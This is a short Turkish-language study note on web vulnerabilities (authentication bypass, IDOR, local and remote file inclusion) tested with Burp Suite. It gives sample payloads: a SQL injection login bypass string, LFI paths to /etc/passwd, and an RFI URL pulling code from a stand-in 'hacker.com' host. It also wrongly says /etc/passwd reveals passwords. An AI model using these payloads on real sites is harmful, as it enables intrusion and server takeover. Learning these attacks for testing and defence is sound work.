# Web Zafiyetleri (Web Vulnerabilities)

Bu not, [[Burp Suite]] kullanılarak sömürülen temel mantıksal ve teknik açıkları içerir.

## Authentication Bypass (Kimlik Doğrulama Atlatma)
Sistemin giriş ekranlarını (Login) şifre bilmeden aşmaktır.
* Mantık hataları (Örn: Şifre sıfırlama ekranında mail adresini başkasınınkiyle değiştirmek).
* SQL Injection (`admin' OR 1=1 --`) ile girişi atlatmak.
* Varsayılan/Tahmin edilebilir şifreler denemek.

## IDOR (Insecure Direct Object Reference)
Kullanıcıların erişmemesi gereken başka kullanıcılara ait nesnelere (fatura, profil, dosya) sadece URL'deki ID değerini değiştirerek erişebilmesidir.
* **Lokasyonlar (Nerelerde Aranır?):** URL parametreleri (`?user_id=12`), gizli form alanları, API istekleri (AJAX), Çerezler (Cookies).
* **Veri Manipülasyonu & Bypass Yöntemleri:**
  * Bazen ID değeri açıkça `12` yazmaz. `Base64` ile şifrelenmiş olabilir (`MTI=`). Bunu Decoder ile çözüp, 13 yapıp tekrar şifreleyerek istek atılır.
  * *Hashed ID:* ID'ler MD5 gibi hash'lerle tutulabilir. Kendi hash'ini analiz edip başkasınınkini tahmin etmeye çalışırsın.
* **Savunma (Unpredictable IDs):** IDOR'u çözmenin yolu ardışık sayılar (`1, 2, 3`) yerine tahmin edilemez **UUID/GUID** (`550e8400-e29b...`) kullanmaktır.

## File Inclusion (Dosya Dahil Etme Açıkları)
Uygulamanın dışarıdan gelen bir dosya çağrısını kontrolsüz şekilde kabul etmesi durumudur. Bayağı tehlikelidir!

**1. LFI (Local File Inclusion):**
Sunucunun "kendi içindeki" hassas dosyaları okumaktır.
* Mantık: `site.com/index.php?page=hakkimizda` yerine `site.com/index.php?page=/etc/passwd` yazarak Linux sunucunun kullanıcı şifrelerini çalmak.
* Bypass taktikleri: *Directory Traversal* (`../../../../etc/passwd`) veya Null Byte (`%00`) eklemek.

**2. RFI (Remote File Inclusion):**
Sunucuya dışarıdan, saldırganın hazırladığı "kötü niyetli bir dosyayı" yükletip çalıştırmaktır. (Sistemde PHP'nin `allow_url_include` ayarı açık olmalıdır).
* Mantık: `site.com/index.php?page=http://hacker.com/zararli_kod.php`
* Sonucu: Sunucu direkt ele geçirilir (Remote Code Execution - RCE).